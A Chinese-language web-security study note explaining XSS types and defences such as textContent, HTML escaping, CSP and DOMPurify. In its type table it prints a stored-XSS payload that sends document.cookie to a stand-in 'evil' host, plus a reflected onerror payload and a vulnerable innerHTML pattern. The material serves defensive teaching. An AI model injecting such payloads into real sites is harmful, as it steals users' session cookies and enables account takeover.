# 🎯 XSS 跨站脚本攻击

> 浏览器把"数据"和"代码"混在一起执行，当**不可信数据**被当作**代码**解析，攻击就发生了。依据 **[OWASP XSS](https://owasp.org/www-community/attacks/xss/)**、**[MDN XSS](https://developer.mozilla.org/zh-CN/docs/Web/Security/Cross_site_scripting)**。

---

## 1. 原理

恶意脚本在受害者浏览器执行，典型后果：盗取 cookie / token、伪造请求、钓鱼弹窗、蠕虫传播。

---

## 2. 三种类型（基础 → 必会）

| 类型 | 注入点 | 触发方式 | 例子 |
|------|--------|----------|------|
| **存储型** | 数据库（评论/昵称/头像） | 其他用户访问时自动执行 | 评论存了 `<script>fetch('evil?c='+document.cookie)</script>` |
| **反射型** | URL 参数 | 诱骗点击带 payload 的链接 | `?q=<img src=x onerror=alert(1)>` 被回显到页面 |
| **DOM 型** | 前端 JS 拼接 | 前端读取 `location`/`document` 后写入 DOM | `el.innerHTML = location.hash.slice(1)` |

!!! tip "一句话区分"
    - 存储/反射型：恶意代码经过**服务器**（存库 or 回显）。
    - DOM 型：**不经过服务器**，纯前端把输入写进 DOM 就中招——前端责任最大。

---

## 3. 基础防御（新人先做到这些）

**前端：**
- 绝不 `element.innerHTML = 不可信字符串`，用 `textContent`（它只当文本）。
- 框架（Vue/React）默认转义插值 `{{ }}` / `{ }`，**别用 `v-html` / `dangerouslySetInnerHTML`** 渲染用户输入。
- URL 里取参数后，拼进 DOM 前先过滤/编码。

**后端：**
- 输出到页面前做 **HTML 实体编码**（`<` → `&lt;`）。
- 设 `Content-Security-Policy` 限制脚本来源（见 [CSP](csp.md)）。

---

## 4. 高级进阶（中高级岗必看）

- **富文本场景**：评论/文章允许有限 HTML，用 **DOMPurify** 按白名单消毒，绝不全量放行。
- **基于模板的 XSS（SSTI）**：服务端模板若把用户输入当模板语法，会升级为 RCE——后端要避免把用户输入当作模板字符串编译。
- **CSP Bypass 现实**：`'unsafe-inline'` + JSONP 接口可绕过；nonce 被复用、CDN 被投毒也会破防。
- **DOM Clobbering**：利用 `<input name=...>` 覆盖全局变量，干扰 sanitizer 逻辑（高级审计项）。
- **Mutation XSS（mXSS）**：DOMPurify 早期因浏览器解析差异漏过，现多已修复——选稳定版本。

!!! danger "DOM 型 XSS 的代码级防护模板"
    ```js
    // ❌ 危险：直接拼接
    box.innerHTML = `<div>${userInput}</div>`

    // ✅ 安全：用 textContent（只当文本）
    const div = document.createElement('div')
    div.textContent = userInput
    box.appendChild(div)

    // ✅ 必须渲染富文本时：DOMPurify 消毒
    import DOMPurify from 'dompurify'
    box.innerHTML = DOMPurify.sanitize(userRichText)
    ```

---

## 5. 真实使用场景

- **评论区 / 用户昵称**：存储型重灾区 → 后端入库前过滤 + 前端渲染用 textContent。
- **搜索框回显**：反射型 → 回显内容做实体编码。
- **SPA 路由参数**：`#/user/<name>` 被写进页面 → 取参后编码再插入。
- **富文本编辑器（掘金/知乎）：**必须 DOMPurify + CSP 双保险。

---

## 6. 下一步

- 配套防护看 [CSP 内容安全策略](csp.md)。
- 相关认证边界看 [认证与授权](auth.md)。
